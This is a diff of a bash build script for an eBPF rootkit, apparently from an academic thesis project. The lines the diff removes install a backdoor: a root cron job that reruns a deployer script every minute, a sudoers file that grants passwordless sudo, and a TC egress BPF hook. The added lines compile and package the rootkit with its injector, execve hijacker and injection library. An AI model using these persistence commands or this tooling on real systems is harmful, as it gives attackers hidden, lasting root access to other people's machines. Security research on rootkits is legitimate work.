@@ -5,7 +5,7 @@
 #The current directory full path
 declare -r DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
 #The location of the file where to write the full rootkit package
-declare -r BASEDIR="/home/osboxes/TFG/apps"
+declare -r OUTPUTDIR="/home/osboxes/TFG/apps/"
 #A variable to determine whether to silence output of internal commands
 declare firstvar=$1
 
@@ -45,20 +45,50 @@ echo "***************** Marcos Sánchez Bajo *****************\n"
 echo "*******************************************************\n"
 echo ""
 
-BACKDOOR_INSTALLED=0
-FILE=/etc/sudoers.d/ebpfbackdoor
-if test -f "$FILE"; then
-   BACKDOOR_INSTALLED=1
-   echo "Backdoor is already installed"
-else
-   echo -e "${BLU}Installing TC hook${NC}"
-   /bin/sudo tc qdisc del dev enp0s3 clsact
-   /bin/sudo tc qdisc add dev enp0s3 clsact
-   /bin/sudo tc filter add dev enp0s3 egress bpf direct-action obj "$BASEDIR"/tc.o sec classifier/egress
-   /bin/sudo "$BASEDIR"/kit -t enp0s3
+if [ "${PWD##*/}" != "helpers" ]; then
+    echo -e "${RED}This file should be launched from the /helpers directory${NC}"
+    exit 1
 fi
 
-## Install a backdoor in cron.d
-echo "* * * * * osboxes /bin/sudo /home/osboxes/TFG/apps/deployer.sh" > /etc/cron.d/ebpfbackdoor
-echo "osboxes ALL=(ALL:ALL) NOPASSWD:ALL #" > /etc/sudoers.d/ebpfbackdoor
+#First compile helpers
+echo -e "${BLU}Compiling helper programs${NC}"
+sleep 1
+quiet make clean
+quiet make
+echo -e "${GRN}Finished${NC}"
+
+#Next compile client
+echo -e "${BLU}Compiling client programs${NC}"
+sleep 1
+cd ../client
+quiet make clean
+quiet make
+echo -e "${GRN}Finished${NC}"
+
+echo -e "${BLU}Compiling rootkit${NC}"
+sleep 1
+cd ../
+quiet make clean
+quiet make
+echo -e "${GRN}Finished${NC}"
+
+echo -e "${BLU}Compiling TC hook${NC}"
+sleep 1
+quiet make tckit
+echo -e "${GRN}Finished${NC}"
+
+echo -e "${BLU}Packaging binary results${NC}"
+cp -a bin/kit $OUTPUTDIR
+cp -a client/injector $OUTPUTDIR
+cp -a helpers/simple_open $OUTPUTDIR
+cp -a helpers/simple_timer $OUTPUTDIR
+cp -a helpers/execve_hijack $OUTPUTDIR
+cp -a helpers/injection_lib.so $OUTPUTDIR
+cp -a tc.o $OUTPUTDIR
+cp -a client/mycert.pem $OUTPUTDIR
+cp -a helpers/deployer.sh $OUTPUTDIR
+echo -e "${GRN}Finished${NC}"
+
+
+
 
